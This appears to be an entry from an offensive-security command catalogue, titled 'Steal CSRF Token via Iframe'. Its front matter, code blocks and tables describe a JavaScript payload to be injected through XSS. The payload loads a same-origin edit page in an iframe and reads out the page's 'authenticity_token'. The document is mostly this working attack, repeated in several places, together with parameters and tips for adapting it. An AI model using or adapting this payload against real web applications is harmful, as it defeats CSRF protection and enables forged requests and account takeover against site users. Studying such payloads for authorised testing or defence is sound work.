---
id: cmd-steal-csrf-token-iframe
data: >-
  document.body.innerHTML="<iframe id=ifr
  src=/widgets/twitter_registrations/edit></iframe>";

  setTimeout(function(){
   alert(ifr.contentDocument.getElementsByName("authenticity_token")[0].value);
  },1337);
tags:
  - csrf
  - iframe
type: command
output: Alert with CSRF token value
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.457Z'
verified: false
validated: true
submitted: true
---
# Steal CSRF Token via Iframe

## Command

```javascript
document.body.innerHTML="<iframe id=ifr src=/widgets/twitter_registrations/edit></iframe>";
setTimeout(function(){
 alert(ifr.contentDocument.getElementsByName("authenticity_token")[0].value);
},1337);
```

## Description

This JavaScript command, injected via XSS, creates an iframe to load a page containing a CSRF token and alerts its value after a short delay to allow loading.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | URL of the page with the token form | Yes |
| setTimeout delay | Milliseconds to wait for iframe load (1337ms) | Yes |
| id=ifr | Iframe identifier for access | Yes |

## Examples

### Basic Usage

```javascript
document.body.innerHTML="<iframe id=ifr src=/widgets/twitter_registrations/edit></iframe>";
setTimeout(function(){
 alert(ifr.contentDocument.getElementsByName("authenticity_token")[0].value);
},1337);
```

### Advanced Usage

Adapt delay or selector if needed, e.g., longer timeout for slow loads.

## Expected Output

An alert dialog displays the raw CSRF token string, e.g., "abc123def456...".

## Related

- [[Related Procedure: Steal-CSRF-Token-using-Iframe]]
